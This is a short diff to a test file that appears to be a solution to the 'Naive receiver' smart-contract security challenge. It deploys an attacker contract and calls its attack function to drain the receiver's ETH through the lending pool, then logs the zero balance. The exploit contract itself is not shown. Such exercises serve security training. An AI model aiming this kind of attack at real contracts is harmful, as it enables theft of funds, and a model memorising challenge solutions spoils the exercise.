@@ -38,6 +38,13 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy the attacker smart contract
+        const Attacker = await ethers.getContractFactory('Attacker_Naive_Receiver', player);
+        attacker = await Attacker.deploy();
+        // Call the attack function
+        await attacker.attack(pool.address,receiver.address,ETHER_IN_POOL);
+        // balance: 0 ETH
+        console.log(await ethers.provider.getBalance(receiver.address))
     });
 
     after(async function () {
